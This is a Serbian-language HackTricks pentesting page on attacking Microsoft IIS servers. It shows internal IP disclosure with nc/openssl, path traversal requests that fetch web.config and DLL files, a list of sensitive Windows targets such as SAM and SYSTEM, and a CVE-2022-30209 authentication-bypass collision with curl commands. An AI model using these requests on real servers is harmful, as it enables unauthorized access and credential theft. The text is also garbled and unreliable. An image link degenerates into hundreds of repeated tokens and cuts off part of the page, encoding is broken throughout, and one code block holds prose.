# IIS - Internet Information Services

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Testirajte ekstenzije izvr≈°nih datoteka:

* asp
* aspx
* config
* php

## Otkrivanje interne IP adrese

Na bilo kom IIS serveru gde dobijete 302, mo≈æete poku≈°ati da uklonite Host zaglavlje i koristite HTTP/1.0, a unutar odgovora Location zaglavlje mo≈æe vam ukazati na internu IP adresu:

```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```

Odgovor otkriva internu IP adresu:

```
The response from the server includes the internal IP address of the system. This information can be useful for an attacker as it provides insight into the network infrastructure. By analyzing the internal IP address, an attacker can potentially identify other vulnerable systems within the network and plan further attacks. It is important to ensure that internal IP addresses are not leaked in server responses to prevent unauthorized access to the network.
```

Odgovor servera ukljuƒçuje internu IP adresu sistema. Ove informacije mogu biti korisne napadaƒçu jer pru≈æaju uvid u mre≈ænu infrastrukturu. Analizirajuƒái internu IP adresu, napadaƒç mo≈æe potencijalno identifikovati druge ranjive sisteme unutar mre≈æe i planirati dalje napade. Va≈æno je osigurati da interne IP adrese ne budu otkrivene u odgovorima servera kako bi se spreƒçio neovla≈°ƒáen pristup mre≈æi.

```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```

## Izvr≈°avanje .config datoteka

Mo≈æete otpremiti .config datoteke i koristiti ih za izvr≈°avanje koda. Jedan naƒçin da to uradite je da dodate kod na kraj datoteke unutar HTML komentara: [Preuzmite primer ovde](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Vi≈°e informacija i tehnika za iskori≈°ƒáavanje ove ranjivosti [ovde](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS otkrivanje metodom isprobavanja

Preuzmite listu koju sam kreirao:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

Ona je kreirana spajanjem sadr≈æaja sledeƒáih lista:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Koristite je bez dodavanja bilo kakvog nastavka, datoteke koje ga zahtevaju veƒá ga imaju.

## Putanja Traversal

### Otkrivanje izvornog koda

Pogledajte potpuni opis na: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
Kao sa≈æetak, postoje nekoliko web.config datoteka unutar foldera aplikacije sa referencama na "**assemblyIdentity**" datoteke i "**namespaces**". Sa ovim informacijama je moguƒáe saznati **gde se nalaze izvr≈°ne datoteke** i preuzeti ih.\
Iz preuzetih Dll datoteka je takoƒëe moguƒáe pronaƒái **nove namespaces** gde biste trebali poku≈°ati pristupiti i dobiti web.config datoteku kako biste prona≈°li nove namespaces i assemblyIdentity.\
Takoƒëe, datoteke **connectionstrings.config** i **global.asax** mogu sadr≈æati zanimljive informacije.\\
{% endhint %}

U **.Net MVC aplikacijama**, datoteka **web.config** ima kljuƒçnu ulogu tako ≈°to kroz XML oznake **"assemblyIdentity"** defini≈°e svaku binarnu datoteku na kojoj aplikacija zavisi.

### **Istra≈æivanje binarnih datoteka**

Primer pristupa **web.config** datoteci je prikazan ispod:

```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```

Ovaj zahtev otkriva razliƒçite postavke i zavisnosti, kao ≈°to su:

* Verzija **EntityFramework**-a
* **AppSettings** za veb stranice, klijentsku validaciju i JavaScript
* Konfiguracije **System.web** za autentifikaciju i izvr≈°no vreme
* Postavke modula **System.webServer**
* Veze skupova za izvr≈°no vreme za brojne biblioteke poput **Microsoft.Owin**, **Newtonsoft.Json** i **System.Web.Mvc**

Ove postavke ukazuju da se odreƒëene datoteke, poput **/bin/WebGrease.dll**, nalaze unutar fascikle /bin aplikacije.

### **Datoteke u korenskom direktorijumu**

Datoteke koje se nalaze u korenskom direktorijumu, poput **/global.asax** i **/connectionstrings.config** (koje sadr≈æe osetljive lozinke), su kljuƒçne za konfiguraciju i rad aplikacije.

### **Prostori imena i Web.Config**

MVC aplikacije takoƒëe defini≈°u dodatne **web.config datoteke** za odreƒëene prostore imena kako bi se izbeglo ponavljanje deklaracija u svakoj datoteci, kao ≈°to je prikazano zahtevom za preuzimanje druge **web.config** datoteke.

```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```

### **Preuzimanje DLL-ova**

Pomen o prilagoƒëenom namespace-u ukazuje na DLL pod nazivom "**WebApplication1**" koji se nalazi u direktorijumu /bin. Nakon toga, prikazan je zahtev za preuzimanje **WebApplication1.dll** datoteke:

```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```

Ovo ukazuje na prisustvo drugih bitnih DLL-ova, poput **System.Web.Mvc.dll** i **System.Web.Optimization.dll**, u direktorijumu /bin.

U scenariju gde DLL uvozi namespace pod nazivom **WebApplication1.Areas.Minded**, napadaƒç mo≈æe zakljuƒçiti postojanje drugih web.config fajlova na predvidljivim putanjama, kao ≈°to su **/area-naziv/Views/**, koji sadr≈æe specifiƒçne konfiguracije i reference na druge DLL-ove u /bin folderu. Na primer, zahtev za **/Minded/Views/web.config** mo≈æe otkriti konfiguracije i namespace-ove koji ukazuju na prisustvo druge DLL datoteke, **WebApplication1.AdditionalFeatures.dll**.

### Uobiƒçajeni fajlovi

Sa [ovog](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/) mesta

```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```

## HTTPAPI 2.0 404 Gre≈°ka

Ako vidite gre≈°ku kao ≈°to je sledeƒáa:

!\[]\(<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1

```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite **va≈°u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
